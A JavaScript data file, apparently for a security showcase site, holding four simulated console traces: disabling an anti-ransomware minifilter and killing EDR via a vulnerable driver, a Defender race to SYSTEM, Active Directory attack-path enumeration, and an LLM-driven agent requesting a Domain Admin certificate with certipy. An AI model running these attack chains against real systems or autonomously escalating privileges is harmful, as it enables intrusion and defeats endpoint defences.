...
// ==========================================================================
// LIVE TELEMETRY STREAM — verification traces surfaced by the console tabs
// and the interactive `cat <target>` CLI commands. Keys map to data-tab ids.
// ==========================================================================
const telemetryLogs = {
    'meedr': {
        title: 'MEEDRBleeder // IOCTL_VOLSNAP_DELETE_SNAPSHOT Kernel Minifilter Trace',
        command: 'kernel_debug_view --driver MEARWFltDriver.sys --filter IOCTL',
        output: `[+] Attaching WinDbg to Ring-0 minifilter stack ....................... OK
[*] Target : MEARWFltDriver.sys (ManageEngine Anti-Ransomware)
[*] Altitude : 328010  (FSFilter Anti-Virus)

[TRACE] IRP_MJ_DEVICE_CONTROL captured
        IOCTL = 0x00560038  (IOCTL_VOLSNAP_DELETE_SNAPSHOT)
        VolumePath = "\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy7"

[LOGIC] PreOp filter evaluates operator: wcsstr(VolumePath, L"HarddiskVolume")
        -> guard string mismatch: minifilter expects "\\Device\\HarddiskVolume<N>"
        -> shadow-copy GLOBALROOT alias slips past the substring check
[RESULT] callback returns FLT_PREOP_SUCCESS_NO_CALLBACK  ==> IOCTL PASSED THROUGH

[+] Volume Shadow Copy set 7 deleted. Anti-ransomware rollback capability : SEVERED

[BYOVD] Loading co-signed vulnerable driver wsftprm.sys (CVE-2023-52271)
        -> mapping arbitrary kernel write primitive
        -> resolving PsLookupProcessByProcessId / ZwTerminateProcess
[SWEEP] Terminating protected EDR service stack from Ring 0:
        cmdAgent.exe    PID 4188 .... TERMINATED
        udrAgent.exe    PID 4204 .... TERMINATED
        fwsys.exe       PID 4260 .... TERMINATED

[STATUS] Endpoint telemetry pipeline offline. Disclosure: COORDINATED (ZOHO / ACKNOWLEDGED).`
    },
    'burning-sun': {
        title: 'Burning Sun // Defender Signature Pipeline TOCTOU Race Trace',
        command: 'procmon_trace --target MsMpEng.exe --oplock --cloudfiles',
        output: `[+] Objective : Local Privilege Escalation -> NT AUTHORITY\\SYSTEM
[*] Vector    : TOCTOU race in Windows Defender real-time signature pipeline

[STEP 1] Register Cloud Files sync-root placeholder
         Path = C:\\Users\\op\\stage\\TargetDll  (HSM dehydrated)
         -> hydration is deferred until first read (fetch-on-open primitive)

[STEP 2] Arm NTFS oplock on the placeholder handle
         OplockLevel = OPLOCK_LEVEL_CACHE_READ | OPLOCK_LEVEL_CACHE_HANDLE
         -> execution parks the moment MsMpEng.exe touches the file

[RACE]  MsMpEng.exe (Defender) opens TargetDll to scan the signature blob
        >> oplock BREAK caught .......... scanner thread FROZEN mid-pipeline
        >> WINDOW OPEN: swap the target out from under the verified handle
        >> junction redirect: stage\\TargetDll  ==>  C:\\Windows\\System32
        >> release oplock ............... scanner resumes on the NEW target

[STEP 3] Trigger Storage Tiering Engine COM activation (SYSTEM context)
         CLSID {A6D3F324-...} -> smphost.exe loads redirected payload
         -> DLL executes as NT AUTHORITY\\SYSTEM

[WHOAMI] nt authority\\system
[STATUS] 0-day. Time-of-check/time-of-use verified. Disclosure: UNPATCHED (coordinated).`
    },
    'cold-relay': {
        title: 'Cold Relay // Active Directory Attack Graph Enumeration',
        command: 'cold-relay run --domain corp.local --classify --graph',
        output: `[*] Cold Relay :: single-binary Go attack-graph & evidence engine
[*] Domain     : corp.local   DC : DC01.corp.local (2019)

[LDAP]  bound corp\\svc_backup  (low-priv)  ....................... OK
[LDAP]  enumerated 812 users / 214 computers / 63 groups
[KERB]  AS-REP roastable (DONT_REQ_PREAUTH) : 3 principals
[KERB]  Kerberoastable SPNs : 11 principals
[ADCS]  CA = corp-DC01-CA   templates enumerated : 24
        template "WebServer-Corp" : ENROLLEE_SUPPLIES_SUBJECT + Client Auth
[DELEG] constrained delegation edge : svc_web -> CIFS/FILE01
        resource-based delegation writable : WS-0429$

[GRAPH] shortest path  svc_backup  ==>  DOMAIN ADMINS
        svc_backup -WriteDACL-> GPO{Default Domain} -Applies-> DC01
                  -ESC1-> WebServer-Corp -Authenticates-> DA

[CLASSIFY] deterministic finding tiers:
        [VALIDATED]   ESC1 mis-scoped template  (enrolled test cert, revoked)
        [VALIDATED]   AS-REP roast -> svc_report offline crack
        [LIKELY]      RBCD takeover of WS-0429$  (write confirmed, not exercised)
        [THEORETICAL] GPO WriteDACL abuse  (ACL present, no side effect run)

[OUT]   evidence bundle written -> ./corp.local-2026.coldrelay.json`
    },
    'software-butcher': {
        title: 'Software Butcher // Autonomous Adversarial Execution Stream',
        command: 'butcher --objective domain-admin --verify findingstore',
        output: `[*] Software Butcher :: LLM-driven autonomous red-team harness
[*] Objective : escalate to Domain Admin  |  Evidence gate : FindingStore

[REASON] model> Recon first. Foothold host WS-0429 has svc_web token cached.
[TOOL]   hexstrike.adapter -> run: "cold-relay run --classify"
[OBSV]   ingested 4 findings (2 validated / 1 likely / 1 theoretical)

[REASON] model> ESC1 is VALIDATED and cheapest. Request cert for DA via template.
[TOOL]   hexstrike.adapter -> certipy req -template WebServer-Corp -upn DA
[OBSV]   certificate issued -> DA.pfx

[VERIFY] FindingStore evidence check on claim "domain-admin-achieved"
         -> require: TGT for DA principal + authenticated LDAP write
         -> artifact present : DA.ccache  ......................... PASS
         -> LDAP whoami as DA .................................... PASS
[STATE]  claim promoted: THEORETICAL -> VALIDATED (evidence-backed)

[GUARD]  hallucinated claim "golden-ticket-planted" rejected
         -> no krbtgt hash artifact in FindingStore .... DISCARDED

[DONE]   objective met. Only evidence-verified findings retained in report.`
    }
};

// Expose globally
window.technicalArticles = technicalArticles;
window.telemetryLogs = telemetryLogs;
